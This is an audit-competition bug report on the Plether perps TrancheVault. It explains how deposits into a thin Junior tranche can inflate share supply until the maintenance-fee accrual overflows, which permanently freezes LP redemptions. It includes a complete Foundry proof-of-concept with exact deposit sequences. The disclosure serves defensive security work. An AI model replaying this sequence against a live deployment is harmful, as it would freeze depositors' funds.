# \#100074 [SC-High] Junior maintenance-fee supply overflow permanently blocks unfunded LP redemptions

**Submitted on Nov 16th 2026 at 07:32:03 UTC by @iam0x04 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100074
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Permanent freezing of funds

## Description

## Brief/Intro

Junior maintenance fees are represented as pending shares until the next checkpoint. The vault calculates the pending fee with full-precision multiplication, but it does not ensure that the issued Junior supply plus those pending shares fits in `uint256`.

An attacker can amplify Junior share supply by depositing while Junior principal is positive but very small. Once issued supply is close enough to `type(uint256).max`, the next completed fee hour makes the effective supply addition overflow. Every later attempt to read or checkpoint effective Junior supply reverts.

HousePool reads Junior effective supply before funding either tranche's redemptions. The overflow therefore leaves otherwise solvent, unfunded Junior and Senior LP redemptions unable to progress. Disabling the fee also fails because configuration finalization checkpoints the old fee before installing the new rate.

The primary PoC reaches the failure roughly 32 hours after the victim Senior deposit activation under a valid, preconfigured `9999 bps` Senior share cap. A secondary reproduction demonstrates the same permanent failure under the release's stricter `8000 bps` cap, where coupon-only preparation takes approximately 3.1 years.


## Vulnerability Details


[`pendingFeeShares`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/JuniorMaintenanceFeeMathLib.sol#L63-L74) uses `Math.mulDiv`, so the fee calculation can return a representable value even when the conceptual multiplication requires 512 bits.

[`accruedTotalSupply`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L340-L359) then adds the pending fee to raw ERC-20 supply with checked arithmetic:

```solidity
rawAndPendingSupply = totalSupply();
rawAndPendingSupply += pendingMaintenanceFeeShares();
```

There is no invariant requiring `totalSupply() + pendingMaintenanceFeeShares() <= type(uint256).max`. Deposits can approach the limit because [`quoteDepositFromState`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1398-L1410) mints shares in proportion to effective supply when Junior pricing assets are very small but still positive.

The failure cannot be repaired through the normal fee controls:

- every nonzero Junior mint or burn first checkpoints the old fee in [`_update`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L314-L334);
- checkpointing tries to mint the overflowing fee shares in [`_checkpointMaintenanceFee`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L417-L448); and
- [`finalizeMaintenanceFeeConfig`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L374-L402) checkpoints the old fee before setting a zero rate.

Finally, [`HousePool._settleLpEpoch`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L823-L842) obtains Junior pricing supply through [`_juniorShareSupply`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1713-L1718) before it can fund pending redemptions. A Junior effective-supply overflow therefore reverts the shared settlement pass, including Senior funding.



## Impact Details

The demonstrated impact is permanent freezing of unfunded LP redemptions.

Once Junior raw share supply is amplified close enough to `type(uint256).max`, one additional maintenance-fee accrual hour makes effective Junior supply overflow. HousePool must read that supply before funding either tranche, so both Junior and Senior redemption settlement reverts even though the pool remains solvent.

In the primary PoC, an unprivileged attacker deposits 421.748066 USDG and permanently blocks redemption funding for 5,002,417.622821 USDG of Senior principal under a valid `9999 bps` Senior share cap. The same failure is reproduced under the release `8000 bps` cap, freezing 6,252,498.684696 USDG of Senior principal after 502.702883 USDG of attacker deposits.

Normal recovery paths do not restore liveness: disabling the maintenance fee reverts because the old fee must first be checkpointed, adding 10,000 USDG of backing does not help, and settlement still reverts after another year. The attacker’s Junior position is also frozen, so this is a griefing attack rather than direct profit extraction.

The attack requires governance to have previously enabled a positive Junior maintenance-fee APR. The PoC uses 1% APR. The fast scenario uses a valid but non-release `9999 bps` cap; the release `8000 bps` configuration requires approximately 3.1 years of coupon accrual. Redemptions funded before the overflow remain claimable.


## Proof of Concept

## Proof of Concept

Save the following test as packages/perps/test/perps/regression/JuniorMaintenanceFeeSupplyOverflow.t.sol.


The PoC runs the actual `TrancheVault`, `HousePool`, maintenance-fee library, ERC-20 supply logic, and asynchronous LP lifecycle from the reviewed project. It uses synthetic settlement tokens and the project's local HousePool test fixture. It is a project-code reproduction, not an end-to-end Pyth or production-deployment test.

Run from the repository root:

```bash
cd packages/perps
forge test --offline --disable-labels \
  --match-path test/perps/regression/JuniorMaintenanceFeeSupplyOverflow.t.sol -vv
```

Expected result:

```text
[PASS] test_PoC_HighCapFreezesSeniorRedemptionInAboutOneDay()
[PASS] test_PoC_ReleaseCapAlsoReachesPermanentFreeze()
```

The passing tests assert the supply headroom violation, exact attacker cost and frozen Senior principal, the arithmetic panic in effective supply, the attacker's own failed Junior exit, the failed Senior funding pass, the failed fee-disable finalization, the ineffectiveness of recapitalization, and the persistence of the unfunded Senior redemption after another year.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolTestBase} from "../shared/HousePoolTestBase.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {JuniorMaintenanceFeeMathLib} from "@plether/perps/libraries/JuniorMaintenanceFeeMathLib.sol";
import {stdError} from "forge-std/StdError.sol";

/// @notice Reproduces the permanent LP-settlement failure caused by overflowing raw supply plus pending Junior fees.
/// @dev This runs the production vault and pool code with the local HousePool fixture. The fixture installs a fresh,
///      unchanged mark through the configured Router identity; it does not exercise Pyth signature verification.
contract JuniorMaintenanceFeeSupplyOverflowTest is HousePoolTestBase {

    uint256 private constant MAX_UINT256 = type(uint256).max;
    uint256 private constant SENIOR_RATE_BPS = 800;
    uint256 private constant JUNIOR_FEE_APR_BPS = 100;
    uint256 private constant VICTIM_SENIOR_ASSETS = 5_000_000e6;
    uint256 private constant MAX_ATTACKER_DEPOSITS = 1000e6;

    address private constant ATTACKER = address(0xA77AC);
    address private constant SENIOR_LP = address(0x5E1);
    address private constant FEE_RECIPIENT = address(0xFEE);

    uint256 private attackerDeposits;

    function test_PoC_HighCapFreezesSeniorRedemptionInAboutOneDay() public {
        _configureCouponAndMaintenanceFee();

        uint256 startTime = 1_710_201_600;
        vm.warp(startTime);
        _refreshMarkForAsyncSettlement();
        assertEq(pool.maxSeniorShareBps(), 9999, "fixture must use a valid configured high cap");
        assertLt(pool.maxSeniorExposureAssets(), type(uint256).max, "absolute Senior cap must be configured");

        _fundSenior(SENIOR_LP, VICTIM_SENIOR_ASSETS);
        _growJuniorSupplyUnderHighCap();
        _assertPermanentFreeze(421_748_066, 5_002_417_622_821);
    }

    function test_PoC_ReleaseCapAlsoReachesPermanentFreeze() public {
        _configureCouponAndMaintenanceFee();

        uint256 startTime = 1_710_201_600;
        vm.warp(startTime);
        _refreshMarkForAsyncSettlement();
        _setSeniorCapacity(40_000_000e6, 8000);

        vm.warp(startTime + 7 days);
        _refreshMarkForAsyncSettlement();
        _fundJunior(address(0xBEEF), 1_250_000e6);
        _fundSenior(SENIOR_LP, VICTIM_SENIOR_ASSETS);

        _growJuniorSupplyUnderReleaseCap();
        _assertPermanentFreeze(502_702_883, 6_252_498_684_696);
    }

    function _assertPermanentFreeze(
        uint256 expectedAttackerDeposits,
        uint256 expectedSeniorPrincipal
    ) private {
        assertEq(attackerDeposits, expectedAttackerDeposits, "unexpected attacker deposit total");
        assertLt(attackerDeposits, MAX_ATTACKER_DEPOSITS, "attacker deposit budget exceeded");
        assertEq(pool.seniorPrincipal(), expectedSeniorPrincipal, "unexpected frozen Senior principal");

        uint256 rawSupply = juniorVault.totalSupply();
        uint256 nextHourFee = JuniorMaintenanceFeeMathLib.pendingFeeShares(rawSupply, JUNIOR_FEE_APR_BPS, 1);
        assertGt(nextHourFee, MAX_UINT256 - rawSupply, "the next completed fee hour must overflow effective supply");

        uint256 victimShares = seniorVault.balanceOf(SENIOR_LP);
        vm.prank(SENIOR_LP);
        uint256 redeemRequest = seniorVault.requestRedeem(victimShares, SENIOR_LP, SENIOR_LP);

        vm.warp(pool.lpEpochStart(redeemRequest));
        vm.expectRevert(stdError.arithmeticError);
        juniorVault.accruedTotalSupply();

        uint256 attackerShares = juniorVault.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        vm.expectRevert(stdError.arithmeticError);
        juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);

        _refreshMarkForAsyncSettlement();
        vm.expectRevert(stdError.arithmeticError);
        pool.settleLpEpoch(0, 0);

        // The owner cannot disable the fee because finalization checkpoints the overflowing old fee first.
        juniorVault.proposeMaintenanceFeeConfig(0, FEE_RECIPIENT);
        vm.warp(juniorVault.maintenanceFeeConfigActivationTime());
        vm.expectRevert(stdError.arithmeticError);
        juniorVault.finalizeMaintenanceFeeConfig();

        // Additional backing does not reduce raw share supply or make settlement progress.
        settlementToken.mint(address(this), 10_000e6);
        settlementToken.approve(address(engine), 10_000e6);
        engine.recapitalizePool(10_000e6);
        _refreshMarkForAsyncSettlement();
        vm.expectRevert(stdError.arithmeticError);
        pool.settleLpEpoch(0, 0);

        vm.warp(block.timestamp + 365 days);
        _refreshMarkForAsyncSettlement();
        vm.expectRevert(stdError.arithmeticError);
        pool.settleLpEpoch(0, 0);
        assertEq(seniorVault.claimableRedeemRequest(redeemRequest, SENIOR_LP), 0, "redemption remains unfunded");
    }

    function _configureCouponAndMaintenanceFee() private {
        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.seniorRateBps = SENIOR_RATE_BPS;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        _refreshMarkForAsyncSettlement();
        pool.finalizePoolConfig();

        juniorVault.proposeMaintenanceFeeConfig(JUNIOR_FEE_APR_BPS, FEE_RECIPIENT);
        vm.warp(juniorVault.maintenanceFeeConfigActivationTime());
        juniorVault.finalizeMaintenanceFeeConfig();
    }

    function _growJuniorSupplyUnderHighCap() private {
        // The valid 9999-bps fixture cap permits a thin but positive Junior tranche. After a 21-hour first interval,
        // ten one-hour deposit activations amplify raw supply into the one-hour fee-overflow band.
        uint256[11] memory elapsedHours = [uint256(21), 1, 1, 1, 1, 1, 1, 1, 1, 1, 1];
        uint256[11] memory deposits = [
            uint256(6_483_989),
            45_680_424,
            45_680_841,
            45_681_258,
            45_681_676,
            45_682_093,
            45_682_510,
            45_682_927,
            45_683_344,
            45_821_407,
            3_987_597
        ];

        for (uint256 i; i < deposits.length; ++i) {
            _depositAndSettle(deposits[i], elapsedHours[i]);
        }
    }

    function _growJuniorSupplyUnderReleaseCap() private {
        // For the configured 8% coupon and 80% Senior cap, the first wait leaves Junior principal barely positive.
        // Each later one-hour activation mints against that small denominator and multiplies raw supply.
        uint256[10] memory elapsedHours = [uint256(27_391), 1, 1, 1, 1, 1, 1, 1, 1, 1];
        uint256[10] memory deposits = [
            uint256(41_899_918),
            57_096_273,
            57_096_794,
            57_097_315,
            57_097_837,
            57_098_358,
            57_098_880,
            57_099_401,
            57_100_204,
            4_017_903
        ];

        for (uint256 i; i < deposits.length; ++i) {
            _depositAndSettle(deposits[i], elapsedHours[i]);
        }
    }

    function _depositAndSettle(
        uint256 assets,
        uint256 hoursToSettle
    ) private {
        _refreshMarkForAsyncSettlement();
        uint256 requestId = _requestAsyncDeposit(juniorVault, ATTACKER, assets);
        attackerDeposits += assets;
        vm.warp(block.timestamp + hoursToSettle * 1 hours);
        _refreshMarkForAsyncSettlement();
        _settleLpEpochForTest();
        _claimAsyncDeposit(juniorVault, requestId, ATTACKER);
    }

}

```

